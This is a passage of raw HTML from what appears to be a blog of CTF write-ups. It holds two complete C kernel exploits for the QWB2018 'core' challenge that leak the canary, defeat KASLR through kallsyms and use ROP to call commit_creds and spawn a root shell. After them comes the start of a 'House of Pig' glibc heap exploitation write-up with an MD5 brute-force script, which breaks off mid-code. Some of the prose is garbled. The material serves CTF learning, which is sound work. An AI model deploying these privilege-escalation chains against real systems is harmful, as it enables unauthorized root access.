class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = init_cred;</span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/14/kernel-rop/image-20230816162343753.png" alt="image-20230816162343753"></p><p><img src="/2023/08/14/kernel-rop/image-20230816161321011.png" alt="image-20230816161321011"></p><h3 id="commit-creds-prepare-kernel-cred-NULL"><a href="#commit-creds-prepare-kernel-cred-NULL" class="headerlink" title="commit_creds(prepare_kernel_cred(NULL))"></a>commit_creds(prepare_kernel_cred(NULL))</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff8106a6d2: mov rdi, rax; jmp rdx; </span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = prepare_kernel_cred;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff810a0f49</span> + bias; <span class="comment">// pop rdx; ret</span></span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff8106a6d2</span> + bias;<span class="comment">//mov rdi, rax; jmp rdx; </span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/14/kernel-rop/image-20230816174130879.png" alt="image-20230816174130879"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Pig</title>
      <link href="/2023/08/12/house-of-pig/"/>
      <url>/2023/08/12/house-of-pig/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/01dwang/house_of_pig">https://github.com/01dwang/house_of_pig</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/c/p/h/h/pig [2]&gt; checksec ./pig</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/house_of_pig-main/pig/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PIG</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> freed_sign[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ALL_PIGS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *peppa_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> peppa_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> peppa_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> peppa_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> peppa_last_size;</span><br><span class="line">  <span class="type">int</span> align1;</span><br><span class="line">  <span class="type">char</span> *mummy_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> mummy_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> mummy_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> mummy_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> mummy_last_size;</span><br><span class="line">  <span class="type">int</span> align2;</span><br><span class="line">  <span class="type">char</span> *daddy_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> daddy_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> daddy_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> daddy_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> daddy_last_size;</span><br><span class="line">  <span class="type">int</span> view_times_left;</span><br><span class="line">  <span class="type">int</span> edit_times_left;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœ€å¤š20ä¸ªå †å—ï¼Œ0x90&lt;&#x3D;å¤§å°&lt;&#x3D;0x430+ 2æ¬¡è¯»ï¼Œ8æ¬¡æ”¹çš„æœºä¼š</p><p>Change rolesæ—¶éœ€è¦ç»•è¿‡md5æ ¡éªŒ</p><p><strong>md5ç‰¹å¾</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">init_v5</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">2</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">3</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">4</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">5</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ä¼šä¸€ä¸ªmd5å€¼strcmpæ—¶ä¼šè¢«00æˆªæ–­ï¼Œæ‰€ä»¥è¾“å…¥æ•°æ®çš„md5ç¬¦åˆå‰ä½ç¬¦åˆâ€œ&lt;D\x00â€å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">head = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    s=<span class="string">b&#x27;A&#x27;</span>+<span class="built_in">str</span>(i).encode()</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(head):</span><br><span class="line">      <span class="built_in">print</span>(s)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A26535034</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ‡æ¢æ—¶æ²¡æœ‰ä¿å­˜des_exist_sign</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_3B3E</span><span class="params">(PIG *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0-&gt;peppa_des_size, a1-&gt;des_size, <span class="keyword">sizeof</span>(mmap_0-&gt;peppa_des_size));</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0-&gt;peppa_freed_sign, a1-&gt;freed_sign, <span class="keyword">sizeof</span>(mmap_0-&gt;peppa_freed_sign));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit å’Œviewæ—¶åˆä»¥des_exist_signä¸ºåˆ¤æ–­æ ‡å‡†è€Œä¸”æ˜¯0æ—¶è¡¨ç¤ºä½¿ç”¨ï¼Œæ¯æ¬¡åˆ‡æ¢å›æ¥éƒ½ä¼šä½¿des_exist_signç½®é›¶ï¼Œdelteæ—¶æœ‰æ²¡æœ‰å°†æŒ‡é’ˆç½®é›¶ï¼Œæ‰€ä»¥é…åˆå­˜åœ¨uaf</p><h3 id="é«˜ç‰ˆæœ¬ä¸‹çš„IO-FILEåˆ©ç”¨"><a href="#é«˜ç‰ˆæœ¬ä¸‹çš„IO-FILEåˆ©ç”¨" class="headerlink" title="é«˜ç‰ˆæœ¬ä¸‹çš„IO_FILEåˆ©ç”¨"></a>é«˜ç‰ˆæœ¬ä¸‹çš„IO_FILEåˆ©ç”¨</h3><p>åœ¨ libc 2.24 ä¹‹åå¢åŠ äº†å¯¹ vtable ä½ç½®åˆæ³•æ€§çš„æ£€æŸ¥ï¼Œglibc ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ vtable åœ°å€çš„åˆæ³•æ€§ï¼Œæ‰€ä»¥åŠ«æŒ _IO_jump_t çš„æ–¹æ³•å¤±æ•ˆï¼Œä½†æ˜¯vtable  _IO_str_jumps æ˜¯åœ¨ check èŒƒå›´å†…ï¼Œè¿™æ ·exitå°±ä¼šè°ƒç”¨_exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, 